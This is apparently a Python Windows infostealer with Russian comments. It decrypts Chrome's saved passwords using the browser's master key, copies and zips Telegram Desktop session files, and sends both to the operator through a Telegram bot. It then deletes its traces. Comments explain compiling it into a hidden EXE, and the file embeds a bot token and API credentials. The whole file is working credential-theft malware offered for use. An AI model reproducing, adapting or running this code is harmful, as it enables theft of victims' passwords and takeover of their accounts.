from telethon import TelegramClient
import fnmatch
import shutil
import glob
from datetime import datetime
from zipfile import ZipFile
import json
from base64 import b64decode
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
import os
import sqlite3
import io

"""
УСТАНОВИТЕ ВСЕ НЕОБХОДИМЫЕ БИБЛИОТЕКИ
cmd > pip install ИМЯ_БИБЛИОТЕКИ

@hlibchyk - telegram по всем вопросам
Спасибо огромное @Functioncc за помощь

Если при компиляции в EXE у вас не нашло модуль - добавьте с помощью аргумента --hidden-import="ИМЯ БИБЛИОТЕКИ"
НАПРИМЕР:
pyinstaller -y -F -w --hidden-import="ИМЯ БИБЛИОТЕКИ" "ПУТЬ/К/НАШЕМУ/ФАЙЛУ.py"
"""



################ зададим несколько пременных ################
name = 'bot'                                                 # любое имя
user_id = 441449437                                          # в @userinfobot ваш айди
app_id = 1364464                                             # https://my.telegram.org/auth?to=apps - берем его здесь
api_hash = '7fbd3b60e149a572735ffc6cad44132c'                # https://my.telegram.org/auth?to=apps - берем его здесь
token = '1182956398:AAHDGIDNM4pS0P_nSrxFsMXGuF9kW2HzSJY'     # @BotFather - создаєм там бота и копируем токен
name_ur_txt = 'default.txt'                                  # Вводим имя будущего тхт файла с паролями(.txt не трогаем)
#############################################################
""""
!!!ВАЖНО НАЖАТЬ КНОПКУ [СТАРТ] В ВАШЕМ БОТЕ!!!!!!!!!! 
иначе нихрена не придет
"""



bot = TelegramClient(name, app_id, api_hash).start(bot_token=token)
name_archive = str(datetime.now().strftime("%d_%m_%y_%I_%M"))
pathusr = os.path.expanduser('~')
paths = ['C:/','D:/','E:/','F:/','G:/','H:/','I:/','J:/'] #несколько дисков где будем искать папку телеграм если она не на дефолтном месте
pattern = 'Telegram Desktop'

path = r'%LocalAppData%\Google\Chrome\User Data\Local State'
path = os.path.expandvars(path)

########## ищем мастеркей для паролей гугл хрома#########
with open(path) as f:
    load = json.load(f)["os_crypt"]["encrypted_key"]
    master_key = b64decode(load)
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

######## функция расшифровки паролей ###########
def decryption(buff, key):
    payload = buff[15:]
    iv = buff[3:15]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass


######## пиздим зашифрованные пароли с хрома и сразу расшифровываем и возвращаем уже результат ##############
def Chrome():
    text = 'YOUR PASSWORDS\n'
    try:
        if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'):
            shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
            conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
            cursor = conn.cursor()
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            for result in cursor.fetchall():
                password = result[2]
                login = result[1]
                url = result[0]
                decrypted_pass = decryption(password, master_key)
                text += url + ' | ' + login + ' | ' + decrypted_pass + '\n'
    except:
        print("error")
        pass
    return text

########### функция поиска папки с телеграмом ##################
def finddir(pattern, path):
    for root, dirs, files in os.walk(path):
        for name in dirs:
            if fnmatch.fnmatch(name, str.lower(pattern)):
                found = os.path.join(root, name)
                return found
            else:
                pass

if os.path.exists(pathusr + '\\AppData\\Roaming\\Telegram Desktop'):           # если телеграм установлен по стандартному пути
    tddir = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\'
    tdata_path = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\'
    tdata_session_zip = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\' + name_archive + ".zip"
    hash_path = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8?*'
else:
    for i in paths:                                     # если телеграм установлен не по стандартному пути, ищем папки 'Telegram Desktop'
        tddir = finddir(pattern, i)
        if (tddir is not None and os.path.exists(tddir + '\\Telegram.exe')): #если есть такая папка и там есть Telegram.exe
            ###### изменяем константы #######
            tdata_path = tddir + '\\tdata\\'
            tdata_session_zip = tddir + '\\' + name_archive + ".zip"
            hash_path = tddir + '\\tdata\\D877F783D5D3EF8?*'
            break
        else:
            continue

##### делаем несколько папок ##########
try:
    os.mkdir(tdata_path + '\\connection_hash')
    os.mkdir(tdata_path + '\\map')
except:
    pass
######### копируем файлы сессии #########
hash_map = glob.iglob(os.path.join(hash_path, "*"))
for file in hash_map:
    if os.path.isfile(file):
        shutil.copy2(file, tdata_path + '\\map')

files16 = glob.iglob(os.path.join(tdata_path, "??????????*"))
for file in files16:
    if os.path.isfile(file):
        shutil.copy2(file, tdata_path + '\\connection_hash')

######## делаем архив с сессией ##########
with ZipFile(tddir + '\\session.zip', 'w') as zipObj:
    for folderName, subfolders, filenames in os.walk(tddir + '\\tdata\\map'):
        for filename in filenames:
            filePath = os.path.join(folderName, filename)
            zipObj.write(filePath)
    for folderName, subfolders, filenames in os.walk(tddir + '\\tdata\\connection_hash'):
        for filename in filenames:
            filePath = os.path.join(folderName, filename)
            zipObj.write(filePath)

old_file_zip = os.path.join(tddir, 'session.zip')     ###переименуем наш архив
file_zip = os.path.join(tddir, name_archive + ".zip")
os.rename(old_file_zip, file_zip)

with io.open(name_ur_txt, "w", encoding="utf-8") as f: #пишем вывод в файл (хз почему через ио. Вроде не крашается)
    f.write(Chrome())
f.close()

########## главная функция ##########################################################
async def main(): #telethon работает асинхронно
    await bot.send_file(user_id, name_ur_txt) #кидаем файл с паролями через бота
    os.remove(name_ur_txt)                    #удаляем файл
    await bot.send_file(user_id, file_zip)    #кидаем архив сессии через бота

    ### дальше удаляем созданные нами файлы
    shutil.rmtree(tdata_path + '\\connection_hash', ignore_errors=True, onerror=None)
    shutil.rmtree(tdata_path + '\\map', ignore_errors=True, onerror=None)
    os.remove(file_zip)

"""____________ЗАПУСК____________"""
with bot:
    bot.loop.run_until_complete(main())
######################################################################################